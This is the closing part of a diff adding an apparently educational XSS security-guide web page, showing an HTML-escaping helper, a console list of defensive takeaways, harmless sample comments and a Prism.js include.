+            setTimeout(() => {
+                demoStatus.className = 'status-message';
+            }, 5000);
+        }
+        
+        // Safe HTML escaping function (for educational purposes)
+        function escapeHTML(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+        
+        // Initialize with educational content
+        document.addEventListener('DOMContentLoaded', () => {
+            console.log(`
+            XSS Security Guide - Key Takeaways:
+            
+            1. NEVER trust user input - always validate and sanitize
+            2. ALWAYS escape output with context-aware encoding
+            3. Implement Content Security Policy (CSP) headers
+            4. Use HttpOnly cookies to protect session data
+            5. Keep dependencies updated to prevent supply chain attacks
+            6. Use modern frameworks with built-in XSS protection
+            7. Conduct regular security testing and code reviews
+            
+            Remember: XSS is preventable with proper coding practices!
+            `);
+            
+            // Add some sample comments
+            comments = [
+                'Great article! Very informative.',
+                'Thanks for explaining XSS so clearly.',
+                'I never realized how dangerous this could be!'
+            ];
+        });
+    </script>
+    
+    <!-- Prism.js for syntax highlighting -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+</body>
+</html>
